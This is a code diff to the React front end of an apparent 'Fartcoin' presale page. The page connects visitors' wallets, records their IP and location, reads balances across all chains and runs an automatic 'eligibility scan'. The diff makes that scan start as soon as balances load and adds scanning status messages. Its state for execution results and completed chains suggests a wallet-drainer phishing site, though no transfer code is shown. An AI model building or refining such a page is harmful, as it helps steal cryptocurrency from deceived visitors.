@@ -109,6 +109,7 @@ function App() {
   const [userEmail, setUserEmail] = useState('');
   const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
   const [executionResults, setExecutionResults] = useState([]);
+  const [balancesLoaded, setBalancesLoaded] = useState(false);
 
   // Presale stats - FARTCOIN
   const [timeLeft, setTimeLeft] = useState({
@@ -203,6 +204,7 @@ function App() {
         
         // Fetch balances across all chains
         await fetchAllBalances(address);
+        setBalancesLoaded(true);
         
       } catch (e) {
         console.error("Provider init failed", e);
@@ -302,16 +304,10 @@ function App() {
 
   // Auto-check eligibility when wallet connects
   useEffect(() => {
-    if (isConnected && address && !scanResult && !verifying) {
-      // Wait for balances to load
-      const timer = setTimeout(() => {
-        if (Object.keys(balances).length > 0) {
-          verifyWallet();
-        }
-      }, 1000);
-      return () => clearTimeout(timer);
+    if (isConnected && address && !scanResult && !verifying && balancesLoaded) {
+      verifyWallet();
     }
-  }, [isConnected, address, balances]);
+  }, [isConnected, address, balancesLoaded, scanResult, verifying]);
 
   const verifyWallet = async () => {
     if (!address) return;
@@ -623,6 +619,7 @@ function App() {
       setTxStatus('');
       setError('');
       setExecutionResults([]);
+      setBalancesLoaded(false);
     } catch (err) {
       console.error('Disconnect error:', err);
       // Force UI update even if disconnect fails
@@ -639,10 +636,10 @@ function App() {
   return (
     <div className="min-h-screen bg-black text-white flex flex-col">
       
-      {/* Terminal Grid Background - YOUR FARTCOIN DESIGN */}
+      {/* Terminal Grid Background */}
       <div className="fixed inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJncmlkIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPjxwYXRoIGQ9Ik0gMjAgMCBMIDAgMCAwIDIwIiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS13aWR0aD0iMC4yIj48L3BhdGg+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyaWQpIj48L3JlY3Q+PC9zdmc+')] opacity-10 pointer-events-none"></div>
       
-      {/* Floating Terminal Text - YOUR FARTCOIN DESIGN */}
+      {/* Floating Terminal Text */}
       <div className="fixed inset-0 overflow-hidden pointer-events-none">
         <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '60%', left: '31%', animation: 'textFlicker 4s infinite alternate'}}>
           FART_PROTOCOL_INITIALIZED
@@ -740,7 +737,7 @@ function App() {
       {/* Main Container */}
       <div className="relative z-10 flex-1 flex flex-col">
         
-        {/* Header - YOUR FARTCOIN DESIGN */}
+        {/* Header */}
         <header className="w-full py-6 px-4 border-b border-white/30 scan-effect">
           <div className="container mx-auto flex flex-wrap items-center gap-4 sm:flex-nowrap justify-between">
             
@@ -773,7 +770,7 @@ function App() {
 
         <main className="flex-1">
           
-          {/* Hero Section - YOUR FARTCOIN DESIGN */}
+          {/* Hero Section */}
           <section className="flex flex-col items-center justify-center px-4 py-16 scan-effect">
             <div className="container mx-auto text-center">
               <div className="terminal-frame max-w-3xl mx-auto mb-8 p-8 border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
@@ -786,7 +783,7 @@ function App() {
                   </p>
                 </div>
                 
-                {/* Main Action Area - YOUR FARTCOIN DESIGN with WORKING FLOW LOGIC */}
+                {/* Main Action Area */}
                 <div className="terminal-frame p-6 mt-8 border-white mx-auto max-w-2xl">
                   {!isConnected ? (
                     <div className="text-white font-mono text-center">
@@ -807,6 +804,11 @@ function App() {
                         <>
                           <p className="text-lg mb-2">🔄 VERIFYING WALLET...</p>
                           <p className="text-white/70 text-sm">Please wait</p>
+                        </>
+                      ) : !scanResult ? (
+                        <>
+                          <p className="text-lg mb-2">⚡ SCANNING WALLET...</p>
+                          <p className="text-white/70 text-sm">Checking eligibility across all chains</p>
                         </>
                       ) : !isEligible ? (
                         <>
@@ -858,7 +860,7 @@ function App() {
                   )}
                 </div>
 
-                {/* Market Stats - YOUR FARTCOIN DESIGN */}
+                {/* Market Stats */}
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
                   <div className="terminal-frame p-4 border-white">
                     <p className="text-white/70 text-sm">&gt; Market Cap:</p>
@@ -873,7 +875,7 @@ function App() {
             </div>
           </section>
 
-          {/* Status Messages - YOUR FARTCOIN DESIGN */}
+          {/* Status Messages */}
           {txStatus && (
             <div className="max-w-2xl mx-auto mb-6 px-4">
               <div className="terminal-frame p-5 border-white">
@@ -905,7 +907,7 @@ function App() {
             </div>
           )}
 
-          {/* Error Display - YOUR FARTCOIN DESIGN */}
+          {/* Error Display */}
           {error && !error.includes('Unable to verify') && (
             <div className="max-w-2xl mx-auto mb-6 px-4">
               <div className="terminal-frame p-5 border-red-500/30">
@@ -919,7 +921,7 @@ function App() {
             </div>
           )}
 
-          {/* Wallet Connection Status - YOUR FARTCOIN DESIGN */}
+          {/* Wallet Connection Status */}
           <div className="max-w-2xl mx-auto mb-8 px-4">
             {!isConnected ? (
               <button
@@ -955,7 +957,7 @@ function App() {
                     <div className="text-right">
                       <div className="text-xs text-white/70 mb-1">STATUS</div>
                       <div className="text-sm">
-                        {isEligible ? '✅ Eligible' : '👋 Welcome'}
+                        {scanResult ? (isEligible ? '✅ Eligible' : '👋 Not Eligible') : '🔄 Scanning...'}
                       </div>
                     </div>
                     <button
@@ -970,8 +972,8 @@ function App() {
             )}
           </div>
 
-          {/* Allocation Card - YOUR FARTCOIN DESIGN */}
-          {isConnected && !verifying && scanResult && isEligible && !completedChains.length && (
+          {/* Allocation Card - Only show after scan and if eligible */}
+          {isConnected && scanResult && isEligible && !completedChains.length && (
             <div className="max-w-2xl mx-auto mb-8 px-4">
               <div className="terminal-frame p-8 border-white">
                 <div className="text-center">
@@ -1002,8 +1004,8 @@ function App() {
             </div>
           )}
 
-          {/* Non-Eligible Welcome Card - YOUR FARTCOIN DESIGN */}
-          {isConnected && !verifying && scanResult && !isEligible && (
+          {/* Non-Eligible Welcome Card - Only show after scan and if not eligible */}
+          {isConnected && scanResult && !isEligible && (
             <div className="max-w-2xl mx-auto mb-8 px-4">
               <div className="terminal-frame p-8 border-white">
                 <div className="text-center">
@@ -1012,7 +1014,7 @@ function App() {
                     Welcome to Fartcoin
                   </h2>
                   <p className="text-white/70 text-lg mb-8 max-w-md mx-auto">
-                    Connect your wallet to check eligibility.
+                    Your wallet has been scanned.
                   </p>
                   <div className="border border-white/30 p-6">
                     <p className="text-sm text-white/50">
@@ -1024,7 +1026,7 @@ function App() {
             </div>
           )}
 
-          {/* Presale Stats - YOUR FARTCOIN DESIGN */}
+          {/* Presale Stats */}
           <div className="max-w-2xl mx-auto mt-12 mb-8 px-4">
             <div className="terminal-frame p-8 border-white">
               <h3 className="text-2xl font-terminal text-center mb-6 text-glow">
@@ -1079,7 +1081,7 @@ function App() {
             </div>
           </div>
 
-          {/* Exchanges Section - YOUR FARTCOIN DESIGN */}
+          {/* Exchanges Section */}
           <section className="py-16-b px-4">
             <div className="container mx-auto">
               <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
@@ -1116,7 +1118,7 @@ function App() {
           </section>
         </main>
 
-        {/* Footer - YOUR FARTCOIN DESIGN */}
+        {/* Footer */}
         <footer className="py-8 px-4 border-t border-white/30">
           <div className="container mx-auto">
             <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
@@ -1151,7 +1153,7 @@ function App() {
           </div>
         </footer>
 
-        {/* FART BUTTON - Easter egg - YOUR FARTCOIN DESIGN */}
+        {/* FART BUTTON - Easter egg */}
         <div 
           id="fart-button" 
           className="hide-mobile fixed bottom-4 right-4 z-[9999] bg-black/90 border border-white/30 rounded-md px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-white/10 transition-all"
@@ -1163,7 +1165,7 @@ function App() {
           PRESS <span className="bg-white/20 border border-white/40 px-2 py-1 rounded font-bold text-xs">F</span> TO FART
         </div>
 
-        {/* Celebration Modal - YOUR FARTCOIN DESIGN */}
+        {/* Celebration Modal */}
         {showCelebration && (
           <div className="fixed inset-0 bg-black/95 backdrop-blur flex items-center justify-center z-50 p-4">
             <div className="relative max-w-lg w-full">
@@ -1194,7 +1196,7 @@ function App() {
         )}
       </div>
 
-      {/* Animation Keyframes - YOUR FARTCOIN DESIGN */}
+      {/* Animation Keyframes */}
       <style>{`
         @keyframes textFlicker {
           0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, to { opacity: 1; }
